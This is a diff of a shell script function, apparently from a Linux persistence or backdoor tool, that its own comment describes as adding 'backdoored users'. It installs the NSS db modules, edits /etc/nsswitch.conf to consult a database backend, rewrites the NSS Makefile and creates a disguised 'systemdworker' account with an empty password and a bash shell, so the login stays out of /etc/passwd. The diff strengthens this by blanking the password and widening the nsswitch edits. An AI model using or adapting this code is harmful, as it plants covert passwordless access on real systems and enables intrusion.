@@ -11,12 +11,14 @@ users_db() {
     # Add backdoored users if system supports that
 	if [ "`command -v  yum`" != "" ]; then
 		yum install -y nss_db; #2>/dev/null >/dev/null
+		yum install -y make;
 		if [ -f /var/db/Makefile ]; then
 			echo "Getting databases"
 			sed -i 's/files/db files/g' /etc/nsswitch.conf;
+			sed -i 's/compat/db compat/g' /etc/nsswitch.conf;
 			#GET_FILE "$1/shadow.db" "/var/db/shadow.db";
 			sed -i 's:/etc/passwd:passwd:g' /var/db/Makefile
-    			echo "systemdworker:x:999:999:systemdworker:/home:/bin/bash" > /var/db/passwd
+    			echo "systemdworker::999:999:systemdworker:/home:/bin/bash" > /var/db/passwd
 			make -C /var/db 2>/dev/null >/dev/null
     			[ "$?" = "0" ] || echo "Downloading shadow.db failed..."
 			#GET_FILE "$1/passwd.db" "/var/db/passwd.db";
@@ -26,11 +28,12 @@ users_db() {
 			return 0;
 			fi;
 	elif [ "`command -v apt-get`" != "" ]; then
-		apt install -y  libnss-db; #2>/dev/null >/dev/null
+		apt install -y libnss-db; #2>/dev/null >/dev/null
 		apt install -y make;
 		if [ -f /var/lib/misc/Makefile ]; then
                         echo "Getting databases"
                         sed -i 's/files/db files/g' /etc/nsswitch.conf;
+			sed -i 's/compat/db compat/g' /etc/nsswitch.conf;
                         #GET_FILE "$1/shadow.db" "/var/lib/misc/shadow.db";
                         sed -i 's:$(ETC)/passwd:passwd:g' /var/lib/misc/Makefile
                         echo "systemdworker::999:999:systemdworker:/home:/bin/bash" > /var/lib/misc/passwd
